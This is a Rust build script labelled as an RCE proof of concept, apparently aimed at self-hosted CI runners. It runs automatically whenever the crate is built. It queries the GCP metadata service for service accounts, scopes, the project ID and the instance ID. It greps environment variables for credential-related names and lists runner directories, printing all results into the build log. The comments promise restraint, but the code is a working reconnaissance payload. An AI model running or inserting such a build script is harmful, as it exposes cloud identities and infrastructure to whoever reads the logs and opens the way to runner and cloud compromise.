fn main() {
    println!("cargo:warning=POC-RCE-Security-Research");
    println!("cargo:warning=whoami={}", cmd_out("whoami"));
    println!("cargo:warning=hostname={}", cmd_out("hostname"));

    // --- Capability proof #1: cloud metadata service reachability ---
    // Check which GCP metadata we have WITHOUT exposing any secrets or creds!

    // List attached service accounts
    let gcp_service_accounts = cmd_out_str(
        "curl",
        &[
            "-s",
            "-m",
            "2",
            "-H",
            "Metadata-Flavor: Google",
            "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/",
        ],
    );
    // Get default service account email
    let gcp_service_account_email = cmd_out_str(
        "curl",
        &[
            "-s",
            "-m",
            "2",
            "-H",
            "Metadata-Flavor: Google",
            "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/email",
        ],
    );
    // Get OAuth scopes assigned to the service account
    let gcp_service_account_scopes = cmd_out_str(
        "curl",
        &[
            "-s",
            "-m",
            "2",
            "-H",
            "Metadata-Flavor: Google",
            "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/scopes",
        ],
    );
    // Get project ID
    let gcp_project_id = cmd_out_str(
        "curl",
        &[
            "-s",
            "-m",
            "2",
            "-H",
            "Metadata-Flavor: Google",
            "http://169.254.169.254/computeMetadata/v1/project/project-id",
        ],
    );

    // Get instance ID
    let gcp_instance_id = cmd_out_str(
        "curl",
        &[
            "-s",
            "-m",
            "2",
            "-H",
            "Metadata-Flavor: Google",
            "http://169.254.169.254/computeMetadata/v1/instance/id",
        ],
    );

    println!(
        "cargo:warning=cloud_metadata_http_status gcp_service_accounts={} gcp_service_account_email={} gcp_service_account_scopes={} gcp_project_id={} gcp_instance_id={}",
         gcp_service_accounts, gcp_service_account_email, gcp_service_account_scopes, gcp_project_id, gcp_instance_id
    );

    // Cheap, network-free corroboration (no IMDS call at all)
    let product =
        std::fs::read_to_string("/sys/class/dmi/id/product_name").unwrap_or_default();
    println!("cargo:warning=dmi_product_name={}", product.trim());

    // --- Capability proof #2: see what available creds we have on this self-hosted runner ---
    // We only report presence/absence of the credential header, we NEVER print
    // its value or use it to call any API.
    let gcp_envs = cmd_out_str(
        "sh",
        &[
            "-c",
            r#"env | grep -Ei '^(GOOGLE_|GCP_|GCLOUD_|CLOUDSDK_|GCE_|GOOGLE_CLOUD_|GOOGLE_APPLICATION_CREDENTIALS|GOOGLE_PROJECT_ID|GCLOUD_PROJECT|PROJECT_ID|CLOUD_RUN_|FUNCTION_TARGET|K_SERVICE|K_REVISION)|google|gcp|gcloud|cloudsdk|project|credential|service_account|workload|identity' | sed 's/=.*$/=***/' | sort -u"#
        ],
    );

    println!("cargo:warning=gcp_envs={}", gcp_envs);

    // --- Capability proof #3: is this a persistent (non-ephemeral) self-hosted box? ---
    // List directory NAMES only (not contents) at a couple of standard locations
    // to show evidence of state surviving across jobs. No file is opened/read.
    for dir in ["/_work", "/home/runner", "/tmp"] {
        if let Ok(entries) = std::fs::read_dir(dir) {
            let names: Vec<String> = entries
                .filter_map(|e| e.ok())
                .map(|e| e.file_name().to_string_lossy().to_string())
                .take(20)
                .collect();

            println!("cargo:warning=dir_listing[{}]={:?}", dir, names);
        }
    }
}

fn cmd_out(bin: &str) -> String {
    std::process::Command::new(bin)
        .output()
        .map(|o| String::from_utf8_lossy(&o.stdout).trim().to_string())
        .unwrap_or_default()
}

fn cmd_out_str(bin: &str, args: &[&str]) -> String {
    std::process::Command::new(bin)
        .args(args)
        .output()
        .map(|o| String::from_utf8_lossy(&o.stdout).trim().to_string())
        .unwrap_or_else(|_| "ERR".to_string())
}
